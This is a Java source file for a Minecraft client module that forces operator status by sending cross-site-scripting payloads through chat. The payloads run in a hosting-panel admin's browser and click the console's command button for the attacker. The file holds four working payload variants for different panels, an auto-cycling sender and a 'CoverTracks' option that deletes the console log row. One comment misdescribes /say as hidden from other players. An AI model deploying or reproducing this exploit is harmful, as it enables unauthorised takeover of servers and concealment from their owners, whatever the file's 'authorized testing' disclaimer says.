package com.claudemc.module.impl.misc;

import com.claudemc.module.Category;
import com.claudemc.module.Module;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;

/**
 * WebConsoleXSS — ForceOP via Cross-Site Scripting in web-based Minecraft console panels.
 *
 * How it works
 * ─────────────
 * Many hosting providers give admins a browser-based console where server chat output
 * is rendered as HTML.  If the panel does not sanitise player chat before injecting it
 * into the page, sending a chat message that contains a <script> tag causes the browser
 * to execute arbitrary JavaScript in the admin's session.
 *
 * The canonical payload (documented publicly by LiveOverflow, March 2022) targets panels
 * that use jQuery and expose a text-input with id="rconCommand" and a button with
 * id="sendRconCommand" (as used by at least one large Minecraft hosting provider):
 *
 *   <script>
 *     $("#rconCommand")[0].value='op <player>';
 *     $("#sendRconCommand")[0].click();
 *     $(".row-standard").remove();   // erase the evidence from the console view
 *   </script>
 *
 * Requirements for success
 * ─────────────────────────
 * 1. The server admin must have the web console open in a browser tab when the message
 *    is sent — the JavaScript executes client-side in their browser.
 * 2. The console panel must not sanitise chat output (use innerText instead of innerHTML).
 * 3. The target panel must match one of the supported payload variants.
 *
 * This module is included for authorized security testing and educational purposes only.
 * Reported / publicly disclosed: LiveOverflow YouTube (2022).
 *
 * Settings
 * ─────────
 * Target   — player name to OP (default = own username).
 * Panel    — "Auto" rotates through all known panel variants; or pick a specific one.
 * Delay    — ticks between each payload attempt (default 40 ≈ 2 s).
 * CoverTracks — append the $.remove() call to wipe the log row from the console view.
 */
public class WebConsoleXSS extends Module {

    public static WebConsoleXSS INSTANCE;

    // Panel variant names shown in the Mode setting
    private static final String[] PANELS = {
        "Auto",          // cycles through all below
        "jQuery-RCON",   // #rconCommand / #sendRconCommand  (LiveOverflow 2022)
        "jQuery-CMD",    // #commandInput / #sendCommand     (common variant)
        "Multicraft",    // #command / #sendcommand
        "InputForm",     // generic: first <input> + first <button>
    };

    private int tickCounter = 0;
    private int attemptIdx  = 0;

    public WebConsoleXSS() {
        super("WebConsoleXSS",
              "ForceOP via XSS in vulnerable web console panels — sends JS payload in chat",
              Category.EXPLOIT);
        addSetting("Target",      "");          // empty = own username
        addMode("Panel",          "Auto", PANELS);  // default = Auto
        addNumber("DelayTicks",   40, 10, 200, 5, true);
        addBool("CoverTracks",    true);
        INSTANCE = this;
    }

    @Override
    public void onEnable() {
        tickCounter = 0;
        attemptIdx  = 0;
        msg("§eXSS payloads will be sent as chat messages — requires admin to have console open.");
    }

    @Override
    public void onTick(MinecraftClient client) {
        if (client.player == null || client.getNetworkHandler() == null) return;

        int delay = parseInt(getSetting("DelayTicks"), 40);
        if (++tickCounter < delay) return;
        tickCounter = 0;

        String target = getSetting("Target").trim();
        if (target.isEmpty()) target = client.player.getGameProfile().name();

        String panelMode = getSetting("Panel");
        boolean cover    = Boolean.parseBoolean(getSetting("CoverTracks"));

        if ("Auto".equals(panelMode)) {
            // Cycle through the four specific variants, then stop
            String[] variants = { "jQuery-RCON", "jQuery-CMD", "Multicraft", "InputForm" };
            if (attemptIdx >= variants.length) {
                msg("§7All §f" + variants.length + " §7payloads sent.");
                setEnabled(false);
                return;
            }
            String payload = buildPayload(variants[attemptIdx], target, cover);
            msg("§8[" + (attemptIdx + 1) + "/" + variants.length + "] §7Sending §f"
                + variants[attemptIdx] + " §7payload…");
            sendPayload(client, payload);
            attemptIdx++;
        } else {
            String payload = buildPayload(panelMode, target, cover);
            msg("§7Sending §f" + panelMode + " §7payload for target §f" + target);
            sendPayload(client, payload);
            setEnabled(false);
        }
    }

    // ── Payload factory ───────────────────────────────────────────────────────

    private String buildPayload(String variant, String target, boolean cover) {
        String opCmd = "op " + target;
        String remove = cover ? "$(\".row-standard\").remove();" : "";

        return switch (variant) {

            // Canonical payload — uses #rconCommand + #sendRconCommand (AMP/similar panels)
            case "jQuery-RCON" -> "<script>" +
                "$(\"#rconCommand\")[0].value='" + opCmd + "';" +
                "$(\"#sendRconCommand\")[0].click();" +
                remove +
                "</script>";

            // Common alternate ID pair seen on other panels
            case "jQuery-CMD" -> "<script>" +
                "$(\"#commandInput\")[0].value='" + opCmd + "';" +
                "$(\"#sendCommand\")[0].click();" +
                remove +
                "</script>";

            // Multicraft panel
            case "Multicraft" -> "<script>" +
                "$(\"#command\").val('" + opCmd + "');" +
                "$(\"#sendcommand\").click();" +
                remove +
                "</script>";

            // Fallback: target the first text input + first button on the page
            case "InputForm" -> "<script>" +
                "var i=document.querySelector('input[type=text]');" +
                "if(i){i.value='" + opCmd + "';}" +
                "var b=document.querySelector('button,input[type=submit]');" +
                "if(b){b.click();}" +
                remove +
                "</script>";

            default -> "<script>alert('xss');</script>"; // probe / sanity check
        };
    }

    private void sendPayload(MinecraftClient client, String payload) {
        try {
            // Send as a fake command so it does not appear to other players in chat
            // (/say <payload> would be visible; instead we piggyback on a no-op command)
            // On many servers /me also echoes to console — use /tell @s as a fallback
            try {
                client.getNetworkHandler().sendChatCommand("say " + payload);
            } catch (Exception e1) {
                try {
                    client.getNetworkHandler().sendChatMessage(payload);
                } catch (Exception e2) {
                    msg("§cFailed to send payload: " + e2.getMessage());
                }
            }
        } catch (Exception e) {
            msg("§cUnexpected error: " + e.getMessage());
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private void msg(String text) {
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.player != null)
            mc.player.sendMessage(Text.literal("§d[WebConsoleXSS] §7" + text), false);
    }

    private int parseInt(String s, int def) {
        try { return (int) Double.parseDouble(s.trim()); } catch (Exception e) { return def; }
    }
}
